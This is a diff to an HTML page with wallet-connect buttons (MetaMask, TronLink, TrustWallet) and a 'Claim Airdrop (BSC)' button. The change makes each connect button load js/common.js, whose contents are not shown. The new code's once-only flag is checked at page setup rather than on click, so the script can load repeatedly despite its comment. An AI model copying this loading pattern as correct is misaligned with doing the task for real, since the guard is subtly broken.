@@ -18,30 +18,34 @@
 <button id="connectTrustwalletButton">Connect TrustWallet</button>
 <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
 
-<!-- This script only loads once the MetaMask button is clicked -->
+<!-- This script only loads once the buttons are clicked -->
 <script>
-  document.getElementById('connectButton').addEventListener('click', function () {
-    // Check if scripts are already loaded to avoid reloading
-    if (!window.metamaskScriptsLoaded) {
+  // Check if common.js is already loaded to avoid reloading
+  if (!window.commonJsLoaded) {
+    document.getElementById('connectButton').addEventListener('click', function () {
       loadScript('js/common.js');
-      loadScript('js/metamask.js');
-      loadScript('deeplinks/metamask-deep.js');
-      loadScript('js/loader.js');
-      window.metamaskScriptsLoaded = true;  // Flag to avoid reloading
-    }
-  });
+    });
 
-  function loadScript(src) {
-    const script = document.createElement('script');
-    script.src = src;
-    script.type = 'text/javascript';
-    document.body.appendChild(script);
+    document.getElementById('connectTronlinkButton').addEventListener('click', function () {
+      loadScript('js/common.js');
+    });
+
+    document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
+      loadScript('js/common.js');
+    });
+
+    function loadScript(src) {
+      const script = document.createElement('script');
+      script.src = src;
+      script.type = 'text/javascript';
+      document.body.appendChild(script);
+    }
+
+    window.commonJsLoaded = true;  // Flag to prevent multiple loads
   }
 </script>
-
 </body>
 </html>
-
 
 
 
